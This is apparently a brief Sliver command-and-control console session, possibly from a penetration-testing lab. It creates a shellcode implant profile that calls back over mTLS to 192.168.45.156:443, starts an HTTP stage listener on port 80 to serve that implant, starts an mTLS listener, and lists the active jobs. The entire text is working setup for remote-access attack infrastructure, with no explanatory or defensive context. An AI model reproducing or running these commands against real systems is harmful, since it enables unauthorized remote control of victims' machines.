sliver > profiles new --mtls 192.168.45.156:443 -G --format shellcode sliver

sliver > stage-listener --url http://192.168.45.156:80 --profile sliver

sliver > mtls -L 192.168.45.156 -l 443

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile                          
==== ====== ========== ====== ========================================
 4    mtls   tcp        443                                           
 5    http   tcp        80     sliver (Sliver name: DEVELOPED_BULLET) 
